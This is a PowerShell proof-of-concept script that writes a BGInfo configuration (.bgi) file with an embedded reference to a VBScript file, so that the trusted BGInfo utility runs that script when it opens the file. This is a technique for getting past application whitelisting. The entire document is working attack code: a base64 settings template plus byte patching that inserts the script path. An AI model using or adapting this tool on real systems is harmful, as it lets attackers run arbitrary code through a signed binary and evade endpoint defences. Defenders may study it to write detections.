<#
	A quick POC to create .bgi file
	Author: 3gstudent @3gstudent
	This way learned from Oddvar Moe [MVP]@Oddvarmoe
	Link: https://msitpros.com/?p=3831

#>
# Change this,set the path of vbs
$VbsPath="C:\test\cmd.vbs"
$Length=$VbsPath.Length+2

$fileContent = "CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA=="
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes("test1.bgi",$fileContentBytes)

$fs=new-object io.filestream "test1.bgi",open
$fs.seek(0,2)| Out-Null
$fs.writebyte($Length)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x34)
$fs.flush()
$fs.close()

$VbsPath | Out-File -Encoding ascii -Append test1.bgi

$fs=new-object io.filestream "test1.bgi",open
$fs.seek(-2,2)| Out-Null
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x01)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.flush()
$fs.close()
